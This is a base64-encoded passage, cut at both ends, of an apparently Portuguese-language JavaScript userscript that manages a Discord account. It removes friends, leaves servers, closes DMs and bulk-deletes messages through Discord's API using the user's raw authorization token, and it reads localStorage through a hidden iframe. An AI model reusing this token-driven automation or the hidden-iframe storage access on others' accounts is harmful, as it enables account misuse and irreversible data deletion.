AgICAgICAgIGA7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgbm90aWZFbGVtZW50LmlubmVySFRNTCA9IGAKICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1ub3RpZmljYXRpb24taWNvbiI+JHtpY29uc1tub3RpZmljYXRpb24udHlwZV0gfHwgaWNvbnMuaW5mb308L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1ub3RpZmljYXRpb24tY29udGVudCI+CiAgICAgICAgICAgICAgICAgICAgJHtub3RpZmljYXRpb24udGl0bGUgPyBgPGRpdiBjbGFzcz0iZGZtLW5vdGlmaWNhdGlvbi10aXRsZSI+JHtub3RpZmljYXRpb24udGl0bGV9PC9kaXY+YCA6ICcnfQogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1ub3RpZmljYXRpb24tbWVzc2FnZSI+JHtub3RpZmljYXRpb24ubWVzc2FnZX08L2Rpdj4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iZGZtLW5vdGlmaWNhdGlvbi1jbG9zZSI+w5c8L2J1dHRvbj4KICAgICAgICAgICAgYDsKICAgICAgICB9CgogICAgICAgIG5vdGlmaWNhdGlvbkNvbnRhaW5lci5hcHBlbmRDaGlsZChub3RpZkVsZW1lbnQpOwogICAgICAgIG5vdGlmRWxlbWVudC5xdWVyeVNlbGVjdG9yKCcuZGZtLW5vdGlmaWNhdGlvbi1jbG9zZScpLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCkgPT4gcmVtb3ZlTm90aWZpY2F0aW9uKG5vdGlmRWxlbWVudCkpOwogICAgICAgIHNldFRpbWVvdXQoKCkgPT4gbm90aWZFbGVtZW50LnBhcmVudEVsZW1lbnQgJiYgcmVtb3ZlTm90aWZpY2F0aW9uKG5vdGlmRWxlbWVudCksIDUwMDApOwogICAgfTsKCiAgICBjb25zdCByZW1vdmVOb3RpZmljYXRpb24gPSAobm90aWZFbGVtZW50KSA9PiB7CiAgICAgICAgbm90aWZFbGVtZW50LmNsYXNzTGlzdC5hZGQoJ3JlbW92aW5nJyk7CiAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgICAgIG5vdGlmRWxlbWVudC5yZW1vdmUoKTsKICAgICAgICAgICAgYWN0aXZlTm90aWZpY2F0aW9ucy0tOwogICAgICAgICAgICBpZiAobm90aWZpY2F0aW9uUXVldWUubGVuZ3RoID4gMCkgewogICAgICAgICAgICAgICAgZGlzcGxheU5vdGlmaWNhdGlvbihub3RpZmljYXRpb25RdWV1ZS5zaGlmdCgpKTsKICAgICAgICAgICAgfQogICAgICAgIH0sIDMwMCk7CiAgICB9OwoKICAgIGNvbnN0IHNob3dTZXR0aW5nc01vZGFsID0gKCkgPT4gewogICAgICAgIGNvbnN0IG1vZGFsID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7CiAgICAgICAgbW9kYWwuY2xhc3NOYW1lID0gJ2RmbS1zZXR0aW5ncy1tb2RhbCc7CiAgICAgICAgbW9kYWwuaW5uZXJIVE1MID0gYAogICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tc2V0dGluZ3MtY29udGVudCI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tc2V0dGluZ3MtdGl0bGUiPkNvbmZpZ3VyYcOnw7VlczwvZGl2PgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXNldHRpbmdzLW9wdGlvbiI+CiAgICAgICAgICAgICAgICAgICAgPGxhYmVsIGNsYXNzPSJkZm0tc2V0dGluZ3MtbGFiZWwiPlRlbXBvIGVudHJlIHJlcXVpc2nDp8O1ZXM6PC9sYWJlbD4KICAgICAgICAgICAgICAgICAgICA8c2VsZWN0IGNsYXNzPSJkZm0tc2V0dGluZ3Mtc2VsZWN0IiBpZD0icmVxdWVzdC1kZWxheSI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxvcHRpb24gdmFsdWU9IjUwMCIgJHtyZXF1ZXN0RGVsYXkgPT09IDUwMCA/ICdzZWxlY3RlZCcgOiAnJ30+NTAwbXMgKFLDoXBpZG8pPC9vcHRpb24+CiAgICAgICAgICAgICAgICAgICAgICAgIDxvcHRpb24gdmFsdWU9IjEwMDAiICR7cmVxdWVzdERlbGF5ID09PSAxMDAwID8gJ3NlbGVjdGVkJyA6ICcnfT4xMDAwbXMgKE5vcm1hbCk8L29wdGlvbj4KICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0iMzAwMCIgJHtyZXF1ZXN0RGVsYXkgPT09IDMwMDAgPyAnc2VsZWN0ZWQnIDogJyd9PjMwMDBtcyAoTGVudG8pPC9vcHRpb24+CiAgICAgICAgICAgICAgICAgICAgPC9zZWxlY3Q+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1tb2RhbC1hY3Rpb25zIj4KICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJkZm0tYnRuIHNlY29uZGFyeSIgaWQ9InNldHRpbmdzLWNhbmNlbCI+Q2FuY2VsYXI8L2J1dHRvbj4KICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJkZm0tYnRuIiBpZD0ic2V0dGluZ3Mtc2F2ZSI+U2FsdmFyPC9idXR0b24+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgYDsKICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKG1vZGFsKTsKCiAgICAgICAgbW9kYWwucXVlcnlTZWxlY3RvcignI3NldHRpbmdzLWNhbmNlbCcpLm9uY2xpY2sgPSAoKSA9PiBtb2RhbC5yZW1vdmUoKTsKICAgICAgICBtb2RhbC5xdWVyeVNlbGVjdG9yKCcjc2V0dGluZ3Mtc2F2ZScpLm9uY2xpY2sgPSAoKSA9PiB7CiAgICAgICAgICAgIHJlcXVlc3REZWxheSA9IHBhcnNlSW50KG1vZGFsLnF1ZXJ5U2VsZWN0b3IoJyNyZXF1ZXN0LWRlbGF5JykudmFsdWUpOwogICAgICAgICAgICBtb2RhbC5yZW1vdmUoKTsKICAgICAgICAgICAgc2hvd05vdGlmaWNhdGlvbignQ29uZmlndXJhw6fDtWVzIHNhbHZhcyEnLCAnc3VjY2VzcycpOwogICAgICAgIH07CgogICAgICAgIG1vZGFsLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKGUpID0+IHsKICAgICAgICAgICAgaWYgKGUudGFyZ2V0ID09PSBtb2RhbCkgbW9kYWwucmVtb3ZlKCk7CiAgICAgICAgfSk7CiAgICB9OwoKICAgIGNvbnN0IGNvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOwogICAgY29udGFpbmVyLmlkID0gJ2Rpc2NvcmQtZnJpZW5kLW1hbmFnZXInOwogICAgY29udGFpbmVyLmlubmVySFRNTCA9IGAKICAgICAgICA8ZGl2IGNsYXNzPSJkZm0taGVhZGVyIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXRpdGxlIj5EaXNjb3JkIE1hbmFnZXI8L2Rpdj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLWNvbnRyb2xzIj4KICAgICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9ImRmbS1idG4taWNvbiIgaWQ9ImRmbS1zZXR0aW5ncyIgdGl0bGU9IkNvbmZpZ3VyYcOnw7VlcyI+4pqZPC9idXR0b24+CiAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJkZm0tYnRuLWljb24iIGlkPSJkZm0tbWluaW1pemUiIHRpdGxlPSJNaW5pbWl6YXIiPuKIkjwvYnV0dG9uPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tdGFicyI+CiAgICAgICAgICAgIDxidXR0b24gY2xhc3M9ImRmbS10YWIgYWN0aXZlIiBkYXRhLXRhYj0iZnJpZW5kcyI+VXN1w6FyaW9zPC9idXR0b24+CiAgICAgICAgICAgIDxidXR0b24gY2xhc3M9ImRmbS10YWIiIGRhdGEtdGFiPSJzZXJ2ZXJzIj5TZXJ2aWRvcmVzPC9idXR0b24+CiAgICAgICAgICAgIDxidXR0b24gY2xhc3M9ImRmbS10YWIiIGRhdGEtdGFiPSJhZHZhbmNlZCI+QXZhbsOnYWRvPC9idXR0b24+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iZGZtLWNvbnRlbnQiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tdGFiLWNvbnRlbnQgYWN0aXZlIiBpZD0iZnJpZW5kcy10YWIiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLWxvYWRpbmciPkNhcnJlZ2FuZG8gYW1pZ29zPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tdGFiLWNvbnRlbnQiIGlkPSJzZXJ2ZXJzLXRhYiI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tbG9hZGluZyI+Q2FycmVnYW5kbyBzZXJ2aWRvcmVzPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tdGFiLWNvbnRlbnQiIGlkPSJhZHZhbmNlZC10YWIiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLWFkdmFuY2VkLXNlY3Rpb24iPgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1zZWN0aW9uLXRpdGxlIj5EZWxldGFyIE1lbnNhZ2VucyBwb3IgSUQ8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tc2VjdGlvbi1kZXNjcmlwdGlvbiI+RGVsZXRlIHN1YXMgbWVuc2FnZW5zIGRlIHVtYSBjb252ZXJzYSB1c2FuZG8gbyBJRCBkbyB1c3XDoXJpbyAoZnVuY2lvbmEgbWVzbW8gcXVlIG7Do28gc2VqYSBtYWlzIGFtaWdvKTwvZGl2PgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1pbnB1dC1ncm91cCI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBjbGFzcz0iZGZtLWlucHV0IiBpZD0iZGVsZXRlLW1zZ3MtdXNlci1pZCIgcGxhY2Vob2xkZXI9IklEIGRvIHVzdcOhcmlvIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iZGZtLWJ0biIgaWQ9ImRlbGV0ZS1tc2dzLWJ5LWlkIj5EZWxldGFyIE1lbnNhZ2VuczwvYnV0dG9uPgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tYWR2YW5jZWQtc2VjdGlvbiBkZm0tYmV0YS1zZWN0aW9uIj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tc2VjdGlvbi1oZWFkZXIiPgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tc2VjdGlvbi10aXRsZSI+RmVjaGFyIFRvZGFzIGFzIERNczwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0iZGZtLWJldGEtYmFkZ2UiPkJFVEE8L3NwYW4+CiAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXNlY3Rpb24tZGVzY3JpcHRpb24iPkZlY2hhIHRvZGFzIGFzIGNvbnZlcnNhcyBwcml2YWRhcyBjb20gc2V1cyBhbWlnb3MuIElzc28gbsOjbyBhcGFnYSBhcyBtZW5zYWdlbnMsIGFwZW5hcyBmZWNoYSBvcyBjYW5haXMgZGUgRE0uPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iZGZtLWJ0biBkYW5nZXIiIGlkPSJjbG9zZS1hbGwtZG1zIj5GZWNoYXIgVG9kYXMgYXMgRE1zIGRlIEFtaWdvczwvYnV0dG9uPgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgYDsKICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoY29udGFpbmVyKTsKCiAgICBsZXQgaXNEcmFnZ2luZyA9IGZhbHNlOwogICAgbGV0IG9mZnNldFgsIG9mZnNldFk7CgogICAgY29uc3QgaGVhZGVyID0gY29udGFpbmVyLnF1ZXJ5U2VsZWN0b3IoJy5kZm0taGVhZGVyJyk7CgogICAgaGVhZGVyLmFkZEV2ZW50TGlzdGVuZXIoJ21vdXNlZG93bicsIChlKSA9PiB7CiAgICAgICAgaWYgKGUudGFyZ2V0LmNsb3Nlc3QoJy5kZm0tYnRuLWljb24nKSkgcmV0dXJuOwogICAgICAgIGlzRHJhZ2dpbmcgPSB0cnVlOwogICAgICAgIGNvbnN0IHJlY3QgPSBjb250YWluZXIuZ2V0Qm91bmRpbmdDbGllbnRSZWN0KCk7CiAgICAgICAgb2Zmc2V0WCA9IGUuY2xpZW50WCAtIHJlY3QubGVmdDsKICAgICAgICBvZmZzZXRZID0gZS5jbGllbnRZIC0gcmVjdC50b3A7CiAgICAgICAgY29udGFpbmVyLnN0eWxlLnRyYW5zaXRpb24gPSAnbm9uZSc7CiAgICAgICAgY29udGFpbmVyLnN0eWxlLnRyYW5zZm9ybSA9ICdub25lJzsKICAgIH0pOwoKICAgIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ21vdXNlbW92ZScsIChlKSA9PiB7CiAgICAgICAgaWYgKCFpc0RyYWdnaW5nKSByZXR1cm47CiAgICAgICAgZS5wcmV2ZW50RGVmYXVsdCgpOwogICAgICAgIGNvbnN0IGNvbnRhaW5lcldpZHRoID0gY29udGFpbmVyLm9mZnNldFdpZHRoOwogICAgICAgIGNvbnN0IGNvbnRhaW5lckhlaWdodCA9IGNvbnRhaW5lci5vZmZzZXRIZWlnaHQ7CiAgICAgICAgY29uc3QgbWF4WCA9IHdpbmRvdy5pbm5lcldpZHRoIC0gY29udGFpbmVyV2lkdGg7CiAgICAgICAgY29uc3QgbWF4WSA9IHdpbmRvdy5pbm5lckhlaWdodCAtIGNvbnRhaW5lckhlaWdodDsKICAgICAgICBjb25zdCB4ID0gTWF0aC5tYXgoMCwgTWF0aC5taW4obWF4WCwgZS5jbGllbnRYIC0gb2Zmc2V0WCkpOwogICAgICAgIGNvbnN0IHkgPSBNYXRoLm1heCgwLCBNYXRoLm1pbihtYXhZLCBlLmNsaWVudFkgLSBvZmZzZXRZKSk7CiAgICAgICAgY29udGFpbmVyLnN0eWxlLmxlZnQgPSBgJHt4fXB4YDsKICAgICAgICBjb250YWluZXIuc3R5bGUudG9wID0gYCR7eX1weGA7CiAgICB9KTsKCiAgICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdtb3VzZXVwJywgKCkgPT4gewogICAgICAgIGlmIChpc0RyYWdnaW5nKSB7CiAgICAgICAgICAgIGlzRHJhZ2dpbmcgPSBmYWxzZTsKICAgICAgICAgICAgY29udGFpbmVyLnN0eWxlLnRyYW5zaXRpb24gPSAnbm9uZSc7CiAgICAgICAgfQogICAgfSk7CgogICAgd2luZG93LmFkZEV2ZW50TGlzdGVuZXIoJ3Jlc2l6ZScsICgpID0+IHsKICAgICAgICBpZiAoIWlzTWFuYWdlck9wZW4pIHJldHVybjsKICAgICAgICBjb25zdCByZWN0ID0gY29udGFpbmVyLmdldEJvdW5kaW5nQ2xpZW50UmVjdCgpOwogICAgICAgIGNvbnN0IG1heFggPSB3aW5kb3cuaW5uZXJXaWR0aCAtIHJlY3Qud2lkdGg7CiAgICAgICAgY29uc3QgbWF4WSA9IHdpbmRvdy5pbm5lckhlaWdodCAtIHJlY3QuaGVpZ2h0OwogICAgICAgIGlmIChyZWN0LmxlZnQgPiBtYXhYKSBjb250YWluZXIuc3R5bGUubGVmdCA9IGAke01hdGgubWF4KDAsIG1heFgpfXB4YDsKICAgICAgICBpZiAocmVjdC50b3AgPiBtYXhZKSBjb250YWluZXIuc3R5bGUudG9wID0gYCR7TWF0aC5tYXgoMCwgbWF4WSl9cHhgOwogICAgfSk7CgogICAgY29uc3Qgc2V0dGluZ3NCdG4gPSBjb250YWluZXIucXVlcnlTZWxlY3RvcignI2RmbS1zZXR0aW5ncycpOwogICAgY29uc3QgbWluaW1pemVCdG4gPSBjb250YWluZXIucXVlcnlTZWxlY3RvcignI2RmbS1taW5pbWl6ZScpOwoKICAgIHNldHRpbmdzQnRuLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKGUpID0+IHsKICAgICAgICBlLnByZXZlbnREZWZhdWx0KCk7CiAgICAgICAgZS5zdG9wUHJvcGFnYXRpb24oKTsKICAgICAgICBzaG93U2V0dGluZ3NNb2RhbCgpOwogICAgfSk7CgogICAgbWluaW1pemVCdG4uYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCAoZSkgPT4gewogICAgICAgIGUucHJldmVudERlZmF1bHQoKTsKICAgICAgICBlLnN0b3BQcm9wYWdhdGlvbigpOwogICAgICAgIGNsb3NlTWFuYWdlcigpOwogICAgfSk7CgogICAgY29uc3QgZGVsZXRlTXNnc0J5SWRCdG4gPSBjb250YWluZXIucXVlcnlTZWxlY3RvcignI2RlbGV0ZS1tc2dzLWJ5LWlkJyk7CiAgICBjb25zdCBkZWxldGVNc2dzSW5wdXQgPSBjb250YWluZXIucXVlcnlTZWxlY3RvcignI2RlbGV0ZS1tc2dzLXVzZXItaWQnKTsKICAgIGNvbnN0IGNsb3NlQWxsRG1zQnRuID0gY29udGFpbmVyLnF1ZXJ5U2VsZWN0b3IoJyNjbG9zZS1hbGwtZG1zJyk7CgogICAgZGVsZXRlTXNnc0J5SWRCdG4uYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCAoZSkgPT4gewogICAgICAgIGUucHJldmVudERlZmF1bHQoKTsKICAgICAgICBlLnN0b3BQcm9wYWdhdGlvbigpOwogICAgICAgIGNvbnN0IHVzZXJJZCA9IGRlbGV0ZU1zZ3NJbnB1dC52YWx1ZTsKICAgICAgICBkZWxldGVNZXNzYWdlc0J5VXNlcklkKHVzZXJJZCk7CiAgICB9KTsKCiAgICBkZWxldGVNc2dzSW5wdXQuYWRkRXZlbnRMaXN0ZW5lcigna2V5cHJlc3MnLCAoZSkgPT4gewogICAgICAgIGlmIChlLmtleSA9PT0gJ0VudGVyJykgewogICAgICAgICAgICBlLnByZXZlbnREZWZhdWx0KCk7CiAgICAgICAgICAgIGNvbnN0IHVzZXJJZCA9IGRlbGV0ZU1zZ3NJbnB1dC52YWx1ZTsKICAgICAgICAgICAgZGVsZXRlTWVzc2FnZXNCeVVzZXJJZCh1c2VySWQpOwogICAgICAgIH0KICAgIH0pOwoKICAgIGNsb3NlQWxsRG1zQnRuLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKGUpID0+IHsKICAgICAgICBlLnByZXZlbnREZWZhdWx0KCk7CiAgICAgICAgZS5zdG9wUHJvcGFnYXRpb24oKTsKICAgICAgICBjbG9zZUFsbEZyaWVuZHNETXMoKTsKICAgIH0pOwoKICAgIGNvbnRhaW5lci5xdWVyeVNlbGVjdG9yQWxsKCcuZGZtLXRhYicpLmZvckVhY2godGFiID0+IHsKICAgICAgICB0YWIuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCAoKSA9PiB7CiAgICAgICAgICAgIGNvbnRhaW5lci5xdWVyeVNlbGVjdG9yQWxsKCcuZGZtLXRhYicpLmZvckVhY2godCA9PiB0LmNsYXNzTGlzdC5yZW1vdmUoJ2FjdGl2ZScpKTsKICAgICAgICAgICAgY29udGFpbmVyLnF1ZXJ5U2VsZWN0b3JBbGwoJy5kZm0tdGFiLWNvbnRlbnQnKS5mb3JFYWNoKGMgPT4gYy5jbGFzc0xpc3QucmVtb3ZlKCdhY3RpdmUnKSk7CiAgICAgICAgICAgIHRhYi5jbGFzc0xpc3QuYWRkKCdhY3RpdmUnKTsKICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoYCR7dGFiLmRhdGFzZXQudGFifS10YWJgKS5jbGFzc0xpc3QuYWRkKCdhY3RpdmUnKTsKICAgICAgICB9KTsKICAgIH0pOwoKICAgIGNvbnN0IGZldGNoRnJpZW5kcyA9IGFzeW5jICgpID0+IHsKICAgICAgICBjb25zdCByZXNwb25zZSA9IGF3YWl0IGZldGNoKCdodHRwczovL2Rpc2NvcmQuY29tL2FwaS92OS91c2Vycy9AbWUvcmVsYXRpb25zaGlwcycsIHsKICAgICAgICAgICAgaGVhZGVyczogeyAnYXV0aG9yaXphdGlvbic6IHRva2VuLCAneC1zdXBlci1wcm9wZXJ0aWVzJzogeFN1cGVyUHJvcGVydGllcyB9CiAgICAgICAgfSk7CiAgICAgICAgcmV0dXJuIHJlc3BvbnNlLmpzb24oKTsKICAgIH07CgogICAgY29uc3QgZmV0Y2hTZXJ2ZXJzID0gYXN5bmMgKCkgPT4gewogICAgICAgIGNvbnN0IHJlc3BvbnNlID0gYXdhaXQgZmV0Y2goJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y5L3VzZXJzL0BtZS9ndWlsZHMnLCB7CiAgICAgICAgICAgIGhlYWRlcnM6IHsgJ2F1dGhvcml6YXRpb24nOiB0b2tlbiwgJ3gtc3VwZXItcHJvcGVydGllcyc6IHhTdXBlclByb3BlcnRpZXMgfQogICAgICAgIH0pOwogICAgICAgIHJldHVybiByZXNwb25zZS5qc29uKCk7CiAgICB9OwoKICAgIGNvbnN0IHJlbW92ZUZyaWVuZCA9IGFzeW5jICh1c2VySWQsIHVzZXJOYW1lLCBhdmF0YXJVcmwpID0+IHsKICAgICAgICBhd2FpdCBmZXRjaChgaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkvdXNlcnMvQG1lL3JlbGF0aW9uc2hpcHMvJHt1c2VySWR9YCwgewogICAgICAgICAgICBoZWFkZXJzOiB7ICdhdXRob3JpemF0aW9uJzogdG9rZW4sICd4LXN1cGVyLXByb3BlcnRpZXMnOiB4U3VwZXJQcm9wZXJ0aWVzIH0sCiAgICAgICAgICAgIG1ldGhvZDogJ0RFTEVURScKICAgICAgICB9KTsKICAgICAgICBzaG93Tm90aWZpY2F0aW9uKCcnLCAnZnJpZW5kLXJlbW92ZWQnLCAnJywgYXZhdGFyVXJsLCB1c2VyTmFtZSk7CiAgICAgICAgYXdhaXQgbmV3IFByb21pc2UociA9PiBzZXRUaW1lb3V0KHIsIHJlcXVlc3REZWxheSkpOwogICAgfTsKCgogICAgY29uc3QgbGVhdmVTZXJ2ZXIgPSBhc3luYyAoc2VydmVySWQsIHNlcnZlck5hbWUsIGljb25VcmwpID0+IHsKICAgICAgICBhd2FpdCBmZXRjaChgaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkvdXNlcnMvQG1lL2d1aWxkcy8ke3NlcnZlcklkfWAsIHsKICAgICAgICAgICAgaGVhZGVyczogeyAnYXV0aG9yaXphdGlvbic6IHRva2VuLCAnY29udGVudC10eXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nLCAneC1zdXBlci1wcm9wZXJ0aWVzJzogeFN1cGVyUHJvcGVydGllcyB9LAogICAgICAgICAgICBib2R5OiBKU09OLnN0cmluZ2lmeSh7IGx1cmtpbmc6IGZhbHNlIH0pLAogICAgICAgICAgICBtZXRob2Q6ICdERUxFVEUnCiAgICAgICAgfSk7CiAgICAgICAgc2hvd05vdGlmaWNhdGlvbignJywgJ3NlcnZlci1sZWZ0JywgJycsIGljb25VcmwsIHNlcnZlck5hbWUpOwogICAgICAgIGF3YWl0IG5ldyBQcm9taXNlKHIgPT4gc2V0VGltZW91dChyLCByZXF1ZXN0RGVsYXkpKTsKICAgIH07CgogICAgY29uc3QgZ2V0Q2hhbm5lbElkID0gYXN5bmMgKHVzZXJJZCkgPT4gewogICAgICAgIGNvbnN0IHJlc3BvbnNlID0gYXdhaXQgZmV0Y2goJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y5L3VzZXJzL0BtZS9jaGFubmVscycsIHsKICAgICAgICAgICAgaGVhZGVyczogeyAnYXV0aG9yaXphdGlvbic6IHRva2VuLCAnY29udGVudC10eXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nLCAneC1zdXBlci1wcm9wZXJ0aWVzJzogeFN1cGVyUHJvcGVydGllcyB9LAogICAgICAgICAgICBib2R5OiBKU09OLnN0cmluZ2lmeSh7IHJlY2lwaWVudHM6IFt1c2VySWRdIH0pLAogICAgICAgICAgICBtZXRob2Q6ICdQT1NUJwogICAgICAgIH0pOwogICAgICAgIGNvbnN0IGRhdGEgPSBhd2FpdCByZXNwb25zZS5qc29uKCk7CiAgICAgICAgcmV0dXJuIGRhdGEuaWQ7CiAgICB9OwoKICAgIGNvbnN0IGZldGNoTWVzc2FnZXMgPSBhc3luYyAoY2hhbm5lbElkLCBiZWZvcmUgPSBudWxsKSA9PiB7CiAgICAgICAgbGV0IHVybCA9IGBodHRwczovL2Rpc2NvcmQuY29tL2FwaS92OS9jaGFubmVscy8ke2NoYW5uZWxJZH0vbWVzc2FnZXM/bGltaXQ9MTAwYDsKICAgICAgICBpZiAoYmVmb3JlKSB1cmwgKz0gYCZiZWZvcmU9JHtiZWZvcmV9YDsKCiAgICAgICAgd2hpbGUgKHRydWUpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGNvbnN0IHJlc3BvbnNlID0gYXdhaXQgZmV0Y2godXJsLCB7CiAgICAgICAgICAgICAgICAgICAgaGVhZGVyczogeyAnYXV0aG9yaXphdGlvbic6IHRva2VuLCAneC1zdXBlci1wcm9wZXJ0aWVzJzogeFN1cGVyUHJvcGVydGllcyB9CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIGlmIChyZXNwb25zZS5vaykgcmV0dXJuIHJlc3BvbnNlLmpzb24oKTsKICAgICAgICAgICAgICAgIGF3YWl0IG5ldyBQcm9taXNlKHIgPT4gc2V0VGltZW91dChyLCAxMDAwMCkpOwogICAgICAgICAgICB9IGNhdGNoIHsKICAgICAgICAgICAgICAgIGF3YWl0IG5ldyBQcm9taXNlKHIgPT4gc2V0VGltZW91dChyLCAxMDAwMCkpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfTsKCiAgICBjb25zdCBkZWxldGVNZXNzYWdlID0gYXN5bmMgKGNoYW5uZWxJZCwgbWVzc2FnZUlkKSA9PiB7CiAgICAgICAgbGV0IGVycm9yQ291bnQgPSAwOwoKICAgICAgICB3aGlsZSAodHJ1ZSkgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBmZXRjaChgaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkvY2hhbm5lbHMvJHtjaGFubmVsSWR9L21lc3NhZ2VzLyR7bWVzc2FnZUlkfWAsIHsKICAgICAgICAgICAgICAgICAgICBtZXRob2Q6ICdERUxFVEUnLAogICAgICAgICAgICAgICAgICAgIGhlYWRlcnM6IHsgJ2F1dGhvcml6YXRpb24nOiB0b2tlbiwgJ3gtc3VwZXItcHJvcGVydGllcyc6IHhTdXBlclByb3BlcnRpZXMgfQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBpZiAocmVzcG9uc2Uub2spIHJldHVybiB0cnVlOwogICAgICAgICAgICAgICAgaWYgKHJlc3BvbnNlLnN0YXR1cyA9PT0gNTAwMjEpIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgICAgIGVycm9yQ291bnQrKzsKICAgICAgICAgICAgICAgIGlmIChlcnJvckNvdW50ID49IDMpIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgICAgIGF3YWl0IG5ldyBQcm9taXNlKHIgPT4gc2V0VGltZW91dChyLCAxMDAwMCkpOwogICAgICAgICAgICB9IGNhdGNoIHsKICAgICAgICAgICAgICAgIGVycm9yQ291bnQrKzsKICAgICAgICAgICAgICAgIGlmIChlcnJvckNvdW50ID49IDMpIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgICAgIGF3YWl0IG5ldyBQcm9taXNlKHIgPT4gc2V0VGltZW91dChyLCAxMDAwMCkpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfTsKCiAgICBjb25zdCBnZXRDdXJyZW50VXNlcklkID0gKCkgPT4gewogICAgICAgIGNvbnN0IGlmcmFtZSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2lmcmFtZScpOwogICAgICAgIGlmcmFtZS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOwogICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoaWZyYW1lKTsKICAgICAgICBjb25zdCBpZCA9IGlmcmFtZS5jb250ZW50V2luZG93LmxvY2FsU3RvcmFnZS5nZXRJdGVtKCd1c2VyX2lkX2NhY2hlJyk7CiAgICAgICAgZG9jdW1lbnQuYm9keS5y